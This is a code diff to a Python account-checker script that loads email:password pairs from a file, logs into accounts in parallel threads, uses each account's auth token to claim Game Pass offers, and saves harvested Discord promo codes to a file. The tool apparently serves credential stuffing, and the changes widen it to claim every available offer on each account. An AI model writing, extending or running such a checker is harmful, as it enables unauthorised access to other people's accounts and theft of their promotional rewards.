@@ -24,6 +24,7 @@ def update_titlebar():
         ctypes.windll.kernel32.SetConsoleTitleW(title)
     except:
         pass
+    print(f"\r{Fore.YELLOW}{title}", end="", flush=True)
 
 
 DISCORD_TOKEN = "YOUR_DISCORD_TOKEN_HERE" #TOKEN HERE
@@ -183,27 +184,47 @@ def check(email, password):
                         return False
                     step_retries += 1
                     try:
-                        r = session.post(
-                            "https://profile.gamepass.com/v2/offers/A3525E6D4370403B9763BCFA97D383D9",
+                        r = session.get(
+                            "https://profile.gamepass.com/v2/offers",
                             headers={"authorization": authtoken},
                             timeout = 10
                         )
                         if r.status_code == 200:
-                            r = r.json()
-                            promo = r.get("resource")
-                            if promo:
+                            offers = r.json().get("offers", [])
+                            promo_found_for_account = False
+                            for offer in offers:
+                                promo = None
+                                if offer.get("offerStatus") == "available":
+                                    try:
+                                        pr = session.post(
+                                            f"https://profile.gamepass.com/v2/offers/{offer.get('offerId')}",
+                                            headers={"authorization": authtoken},
+                                            timeout = 10
+                                        )
+                                        if pr.status_code == 200:
+                                            promo = pr.json().get("resource")
+                                    except Exception:
+                                        pass
+                                elif offer.get("offerStatus") == "claimed":
+                                    promo = offer.get("resource")
+                                
+                                if promo and "discord" in promo.lower():
                                     with save_lock:
                                         promos_found += 1
                                         
-                                        # Autocheck
                                         promo_data, error_msg = check_promo(promo)
                                         if promo_data:
                                             formatted_promo = f"{promo} | uses: {promo_data['uses']} | max uses: {promo_data['max_uses']} | expires at: {promo_data['expires_at']}"
-                                            print(f"{Fore.CYAN}Found working promo: {formatted_promo}")
+                                            print(f"\n{Fore.CYAN}Found working promo: {formatted_promo}")
                                             open("promos.txt", "a").write(f"{formatted_promo}\n")
                                         else:
-                                            print(f"{Fore.RED}Found promo ({error_msg}): {promo}")
-                        elif r.status_code == 403:
+                                            print(f"\n{Fore.RED}Found promo ({error_msg}): {promo}")
+                                    promo_found_for_account = True
+                                    break
+                            
+                            if not promo_found_for_account:
+                                return False
+                        elif r.status_code in [401, 403]:
                             return False
                         else:
                             continue
@@ -214,17 +235,16 @@ def check(email, password):
                         print(e)
                         continue
                 update_titlebar()
-                break  # Exit the loop when checking is complete      
+    
             else:
                 break     
         except Exception as e:
-            print(e)
             if "timeout" not in str(e).lower():
                 with print_lock:
-                    print(f"{Fore.RED}Error: {e} {email}:{password}")
+                    print(f"\n{Fore.RED}Error: {e} {email}:{password}")
             continue
 
-with open("accs.txt", "r") as f:
+with open("accs.txt", "r", encoding="utf-8", errors="ignore") as f:
     accounts = f.readlines()
 
 valid_accounts = []
@@ -246,17 +266,23 @@ def submit_check(email, password):
     update_titlebar()
     return result
 
+print(f"{Fore.CYAN}Starting checker with {total_accounts} accounts...")
 update_titlebar()
 
-with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
-    futures = []
-    for email, password in valid_accounts:
-        future = executor.submit(submit_check, email, password)
-        futures.append(future)
+try:
+    with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
+        futures = []
+        for email, password in valid_accounts:
+            future = executor.submit(submit_check, email, password)
+            futures.append(future)
 
-    for future in as_completed(futures):
-        try:
-            future.result()
-        except Exception as e:
-
-            pass
+        for future in as_completed(futures):
+            try:
+                future.result()
+            except Exception as e:
+                pass
+    print(f"\n{Fore.GREEN}Finished checking all accounts.")
+except KeyboardInterrupt:
+    import os
+    print(f"\n{Fore.RED}Program interrupted by user. Exiting...")
+    os._exit(0)
